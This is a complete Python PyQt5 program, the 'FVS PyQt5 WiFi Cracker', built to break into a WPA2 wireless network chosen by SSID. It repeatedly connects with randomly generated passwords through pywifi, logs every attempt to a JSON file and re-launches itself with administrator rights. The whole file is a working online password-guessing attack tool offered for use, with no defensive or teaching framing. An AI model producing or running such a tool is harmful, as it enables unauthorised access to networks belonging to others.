import os
import sys
import json
import time
import random
import string

from pathlib import Path
from PyQt5.QtWidgets import (
    QApplication, QWidget, QLabel, QLineEdit, QTextEdit, QPushButton,
    QFormLayout, QHBoxLayout, QVBoxLayout, QMessageBox
)
from PyQt5.QtGui import QFont, QColor, QTextCharFormat, QTextCursor
from PyQt5.QtCore import Qt, QThread, pyqtSignal

from pywifi import PyWiFi, const, Profile
import ctypes

# ─── CONFIG ─────────────────────────────────────────────────────────────────────
OUTPUT_DIR = "lists"
Path(OUTPUT_DIR).mkdir(exist_ok=True)
TRIED_FILE = os.path.join(OUTPUT_DIR, "tried_passwords.json")
SETTINGS_FILE = "settings.json"

# ─── UTILITIES ──────────────────────────────────────────────────────────────────
def load_json(path, default):
    if os.path.exists(path):
        try:
            with open(path, "r", encoding="utf-8") as f:
                return json.load(f)
        except:
            pass
    return default

def save_json(path, data):
    with open(path, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2)

# elevate on Windows if needed
def ensure_admin():
    try:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin()
    except:
        is_admin = True
    if not is_admin:
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable,
            " ".join(sys.argv), None, 1
        )
        sys.exit(0)

# ─── CRACKING THREAD ────────────────────────────────────────────────────────────
class CrackThread(QThread):
    log      = pyqtSignal(str)
    finished = pyqtSignal(int)
    warning  = pyqtSignal(str)

    def __init__(self, ssid, total_len, letters_n, nums_n, special_n, specific_pw):
        super().__init__()
        self.ssid      = ssid
        self.total     = total_len
        self.letters_n = letters_n
        self.nums_n    = nums_n
        self.special_n = special_n
        self.specific  = specific_pw.strip()
        self.running   = True

        # load existing tried list
        self.tried = load_json(TRIED_FILE, [])

        # for fast in‑memory duplicate checks
        self.attempted = { e['password'] for e in self.tried if 'password' in e }

    def run(self):
        # Test specific pw first
        if self.specific:
            self.log.emit(f"→ Testing specific PW “{self.specific}”…")
            if self._try_connect(self.specific):
                self.log.emit(f"✅ Connected with specific: {self.specific}")
                self.finished.emit(1)
                return
            else:
                self.log.emit(f"❌ Specific failed: {self.specific}")

        charset = string.ascii_letters + string.digits + "!@#$%^&*()_-+=<>?"
        count = 0
        while self.running:
            # build candidate
            pw_list = []
            pw_list += random.choices(string.ascii_letters, k=self.letters_n)
            pw_list += random.choices(string.digits,      k=self.nums_n)
            pw_list += random.choices("!@#$%^&*()_-+=<>?", k=self.special_n)
            rem = self.total - len(pw_list)
            if rem > 0:
                pw_list += random.choices(charset, k=rem)
            random.shuffle(pw_list)
            pwd = "".join(pw_list)

            if pwd in self.attempted:
                continue
            self.attempted.add(pwd)

            ok = self._try_connect(pwd)
            count += 1

            if ok:
                self.log.emit(f"✅ Connected! SSID={self.ssid}  PASS={pwd}")
                break
            else:
                self.log.emit(f"❌ Tried: {pwd}")

        self.finished.emit(count)

    def stop(self):
        self.running = False

    def _try_connect(self, pwd):
        wifi  = PyWiFi()
        iface = wifi.interfaces()[0]
        iface.disconnect()
        time.sleep(0.8)

        profile = Profile()
        profile.ssid = self.ssid
        profile.auth  = const.AUTH_ALG_OPEN
        profile.akm   = [const.AKM_TYPE_WPA2PSK]
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key    = pwd

        iface.remove_all_network_profiles()
        tmp = iface.add_network_profile(profile)
        iface.connect(tmp)
        time.sleep(1)
        status = iface.status() == const.IFACE_CONNECTED

        # record attempt
        entry = {"password": pwd}
        self.tried.append(entry)
        save_json(TRIED_FILE, self.tried)
        return status

# ─── MAIN WINDOW ────────────────────────────────────────────────────────────────
class MainWindow(QWidget):
    def __init__(self):
        super().__init__()
        ensure_admin()
        self.setWindowTitle("FVS PyQt5 WiFi Cracker")
        self.setStyleSheet("background:#0d0d0d; color:#00ff99;")  # Green on black theme
        self.resize(700, 600)

        self.settings = load_json(SETTINGS_FILE, {})
        self.thread   = None

        self._build_ui()
        self._load_settings()

    def _build_ui(self):
        font_lbl = QFont("Consolas", 11)
        f = QFormLayout()

        def mk_edit(key, default=""):
            e = QLineEdit()
            e.setStyleSheet("background:#1e1e1e; color:#00ff99;")  # Dark input fields with green text
            e.setFont(font_lbl)
            e.setText(self.settings.get(key, default))
            f.addRow(QLabel(key.replace("_"," ").title()+":"), e)
            return e

        self.ssid_edit    = mk_edit("ssid")
        self.total_edit   = mk_edit("total_length")
        self.letters_edit = mk_edit("letters_count")
        self.nums_edit    = mk_edit("numbers_count")
        self.special_edit = mk_edit("special_count")
        self.specpw_edit  = mk_edit("specific_password")

        # Buttons
        btn_layout = QHBoxLayout()
        for text, handler in [
            ("Start",       self.start),
            ("Stop",        self.stop),
            ("Test Specific", self.test_specific),
            ("Remove Dups", self.remove_dups),
            ("Show Count",  self.show_count),
            ("Exit",        self.exit_app),
        ]:
            b = QPushButton(text)
            b.setFont(font_lbl)
            b.setStyleSheet("background:#00ff99; color:#0d0d0d;")  # Green button with dark text
            b.clicked.connect(handler)
            btn_layout.addWidget(b)

        # Log area
        self.log = QTextEdit()
        self.log.setReadOnly(True)
        self.log.setStyleSheet("background:#0d0d0d; color:#00ff99;")  # Green on black output
        self.log.setFont(QFont("Consolas", 10))

        layout = QVBoxLayout()
        layout.addLayout(f)
        layout.addLayout(btn_layout)
        layout.addWidget(self.log)
        self.setLayout(layout)

    def _load_settings(self):
        # already loaded; nothing further needed
        pass

    def _save_settings(self):
        self.settings.update({
            "ssid":              self.ssid_edit.text(),
            "total_length":      self.total_edit.text(),
            "letters_count":     self.letters_edit.text(),
            "numbers_count":     self.nums_edit.text(),
            "special_count":     self.special_edit.text(),
            "specific_password": self.specpw_edit.text(),
        })
        save_json(SETTINGS_FILE, self.settings)

    def _log(self, msg):
        self.log.append(msg)
        self.log.moveCursor(QTextCursor.End)

    def start(self):
        if self.thread and self.thread.isRunning():
            self._log("Already running.")
            return

        # parse inputs
        try:
            total   = int(self.total_edit.text())
            letters = int(self.letters_edit.text())
            nums    = int(self.nums_edit.text())
            spec    = int(self.special_edit.text())
        except ValueError:
            QMessageBox.critical(self, "Error", "Invalid numeric fields.")
            return

        ssid = self.ssid_edit.text().strip()
        if not ssid:
            QMessageBox.critical(self, "Error", "SSID required.")
            return

        self._save_settings()
        self._log("→ Starting crack thread…")
        self.thread = CrackThread(
            ssid, total, letters, nums,
            spec, self.specpw_edit.text()
        )
        self.thread.log.connect(self._log)
        self.thread.finished.connect(lambda c: self._log(f"● Finished after {c} attempts."))
        self.thread.start()

    def stop(self):
        if self.thread and self.thread.isRunning():
            self.thread.stop()
            self._log("⏹ Stop requested.")
        else:
            self._log("Not running.")

    def test_specific(self):
        ssid = self.ssid_edit.text().strip()
        pw   = self.specpw_edit.text().strip()
        if not ssid or not pw:
            QMessageBox.warning(self, "Warning", "SSID and Specific PW required.")
            return
        self._log(f"→ Testing specific “{pw}”…")
        ok = CrackThread(ssid,0,0,0,0,pw)._try_connect(pw)
        self._log("✅ Success!" if ok else "❌ Failed.")

    def remove_dups(self):
        tried = load_json(TRIED_FILE, [])
        before = len(tried)
        seen = set()
        unique = []
        for e in tried:
            pw = e.get("password")
            if pw and pw not in seen:
                seen.add(pw)
                unique.append(e)
        save_json(TRIED_FILE, unique)
        self._log(f"🔄 Removed {before - len(unique)} duplicates.")

    def show_count(self):
        tried = load_json(TRIED_FILE, [])
        self._log(f"📊 {len(tried)} entries in tried_passwords.json")

    def exit_app(self):
        self._save_settings()
        self._log("👋 Exiting.")
        QApplication.instance().quit()

if __name__ == "__main__":
    app = QApplication(sys.argv)
    w = MainWindow()
    w.show()
    sys.exit(app.exec_())
